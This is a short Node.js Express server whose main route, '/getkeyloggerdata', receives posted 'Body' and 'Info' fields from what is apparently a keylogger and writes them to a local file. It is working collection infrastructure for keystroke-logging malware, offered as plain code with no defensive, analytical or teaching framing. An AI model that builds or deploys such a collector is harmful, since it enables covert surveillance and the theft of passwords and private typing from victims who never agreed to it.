
const express = require('express')
const bodyParser = require('body-parser')
var fs = require('fs');
// Create a new instance of express
const app = express()


app.use(express.static(__dirname + '/public'));
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({
   extended: false
}));

app.post('/getkeyloggerdata', function (req, res) {
  const body = req.body.Body
  const info = req.body.Info
  res.set('Content-Type', 'application/json')
  res.send(body)
  console.log(req.body)
  fs.writeFile('output.txt', body+'\n'+info, function (err) {
    if (err) throw err;
    console.log('Saved!');
  });
})
app.get('/', function (req, res) {
  res.send("Hello")
})


// Tell our app to listen on port 3000
app.listen(3000, function (err) {
  if (err) {
    throw err
  }
  console.log('Server started on port 3000')
})
